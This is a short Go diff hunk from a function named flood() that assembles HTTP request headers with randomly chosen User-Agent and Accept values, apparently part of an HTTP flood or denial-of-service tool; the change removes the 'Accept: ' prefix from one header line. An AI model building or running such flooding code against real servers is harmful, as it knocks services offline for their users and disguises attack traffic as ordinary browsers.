@@ -151,7 +151,7 @@ func flood() {
 		if os.Args[7] == "nil" {
 			header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
 			header += "User-Agent: " + UserAgents[rand.Intn(len(UserAgents))] + "\r\n"
-			header += "Accept: " + acceptall[rand.Intn(len(acceptall))] + "\r\n"
+			header += acceptall[rand.Intn(len(acceptall))] + "\r\n"
 		} else {
 			fi, err := os.Open(os.Args[7])
 			if err != nil {
